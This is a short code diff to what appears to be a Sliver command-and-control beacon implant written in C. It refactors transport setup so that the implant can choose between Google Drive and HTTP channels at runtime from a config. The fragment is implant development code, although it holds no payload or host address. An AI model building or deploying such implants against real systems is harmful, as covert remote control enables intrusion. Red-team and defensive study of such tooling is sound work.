@@ -402,7 +402,7 @@ VOID BeaconMainLoop
 	HANDLE hEvent = NULL;
 
 	hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
-	pBeacon->lpClient = pBeacon->Init();
+	pBeacon->lpClient = pBeacon->Init(pBeacon->pGlobalConfig);
 	if (pBeacon->lpClient == NULL) {
 		goto CLEANUP;
 	}
@@ -498,16 +498,29 @@ PSLIVER_BEACON_CLIENT BeaconInit
 	pBeacon->dwJitter = dwJitter;
 	lpUuid = GenerateUUIDv4();
 	lstrcpyA(pBeacon->szInstanceID, lpUuid);
-#ifdef _DRIVE
-	pBeacon->Init = (CLIENT_INIT)DriveInit;
-	pBeacon->Start = DriveStart;
-	pBeacon->Send = DriveSend;
-	pBeacon->Receive = DriveRecv;
-	pBeacon->Close = DriveClose;
-	pBeacon->Cleanup = FreeDriveClient;
-#else
-#endif
-
+	
+	if (pGlobalConfig->Protocol == Drive) {
+		pBeacon->Init = (CLIENT_INIT)DriveInit;
+		pBeacon->Start = DriveStart;
+		pBeacon->Send = DriveSend;
+		pBeacon->Receive = DriveRecv;
+		pBeacon->Close = DriveClose;
+		pBeacon->Cleanup = FreeDriveClient;
+	}
+	else if (pGlobalConfig->Protocol == Http) {
+		pBeacon->Init = (CLIENT_INIT)HttpInit;
+		pBeacon->Start = HttpStart;
+		pBeacon->Send = HttpSend;
+		pBeacon->Receive = HttpRecv;
+		pBeacon->Close = HttpClose;
+		pBeacon->Cleanup = FreeHttpClient;
+	}
+	else {
+		FREE(pBeacon);
+		pBeacon = NULL;
+		goto CLEANUP;
+	}
+	
 CLEANUP:
 	FREE(lpUuid);
 
